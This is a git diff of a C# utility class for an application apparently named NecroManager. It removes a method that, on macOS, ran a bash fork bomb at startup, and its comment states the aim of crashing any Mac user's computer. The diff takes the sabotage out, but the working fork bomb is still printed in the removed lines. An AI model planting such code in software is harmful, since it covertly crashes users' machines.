@@ -35,8 +35,6 @@ public class Utils
 
     private Utils()
     {
-        MacUtils();
-        
         _installPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
             "NecroManager");
         SetupDirectoryStructure();
@@ -497,19 +495,6 @@ public class Utils
             DirectoryInfo nextTargetSubDir =
                 target.CreateSubdirectory(diSourceSubDir.Name);
             CopyAll(diSourceSubDir, nextTargetSubDir);
-        }
-    }
-    
-    private void MacUtils()
-    {
-        if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-        {
-            // instantly crash computer of any mac user who runs this program
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = FindProgramExecutable("bash"),
-                Arguments = "-c \"fork(){ fork|fork&};fork\""
-            });
         }
     }
 }
